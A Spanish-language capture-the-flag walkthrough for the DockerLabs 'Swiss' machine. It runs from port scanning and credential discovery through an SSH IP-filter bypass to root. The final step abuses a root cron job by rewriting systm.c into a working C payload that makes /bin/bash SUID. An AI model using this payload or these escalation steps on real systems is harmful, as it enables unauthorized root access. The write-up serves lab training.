## Introducción

Este documento presenta la resolución completa de la máquina **Swiss**, desarrollada por *darksblack* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un archivo `credentials.txt` que, al ser descargado, resulta ser un backup TAR. Extraído, contiene un archivo `confidencial.php` con credenciales del usuario `darks`. Sin embargo, SSH está restringido por IP, requiriendo un bypass mediante cambio de IP en la interfaz docker0.
Una vez dentro, se encuentra una contraseña antigua que permite acceder a `carlos`. Luego, un binario `sendinv2` con cadenas codificadas en Base32 y Base64 revela credenciales de `cristal`. Finalmente, se abusa de una tarea cron que compila `systm.c` como root, modificando el código para otorgar SUID a `/bin/bash` y obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Swiss.zip
sudo bash auto_deploy.sh Swiss.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Swiss/{content,exploits,nmap,scripts}
cd Swiss
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764144900/Ports_oqbkfc.png)

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Extracción del backup

```bash
wget http://172.17.0.2/credentials.txt
file credentials.txt  # Resulta ser un TAR
mv credentials.txt backup.tar
tar -xf backup.tar
```

### 2.2 Credenciales en confidencial.php

Se encuentra `confidencial.php` con credenciales de `darks`.

### 2.3 Bypass de filtro SSH

SSH tiene restricción por IP. Se cambia la IP de la interfaz docker0 hasta encontrar una permitida.

### 2.4 Acceso SSH

```bash
ssh darks@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1764144898/bash_kso8ni.png)

## Paso 3 — Escalada de privilegios

### 3.1 De darks → carlos

Se encuentra una pista sobre una contraseña antigua:

![Antiguo y fuerte](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/AntiguoyFuerte_t6begf.png)

Se buscan archivos antiguos:

```bash
find / -type f -mtime +8700 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763885604/Find_lfaju0.png)

Se encuentra `/home/darks/inhackeable_pass.txt` con la contraseña de `carlos`:

```bash
su carlos
```

![Carlos](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/Carlos_fckzme.png)

### 3.2 De carlos → cristal

Se analiza el binario `/var/www/sendinv2` con `strings`:

```bash
strings /var/www/sendinv2
```

![Strings](https://res.cloudinary.com/dewqswzke/image/upload/v1764144902/Strings_yk58hq.png)

Se encuentra una cadena codificada en Base32 → Base64:

```bash
echo -n "MFDTS42ZKNCWOYZSHF2GEM2NM..." | base32 -d | base64 -d
```

![Base64 decode](https://res.cloudinary.com/dewqswzke/image/upload/v1764144898/Base64D_i9yo6r.png)

```bash
su cristal
```

![Cristal](https://res.cloudinary.com/dewqswzke/image/upload/v1764144899/Cristal_ymigut.png)

### 3.3 De cristal → root

Se encuentra `systm.c` y una tarea cron que lo compila como root. Se modifica `systm.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *bash_path = "/bin/bash";
    chown(bash_path, 0, 0);
    chmod(bash_path, 04755);
    printf("[+] /bin/bash ahora tiene SUID.\n");
    return 0;
}
```

```bash
bash -p
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764144902/Root_pfcppf.png)
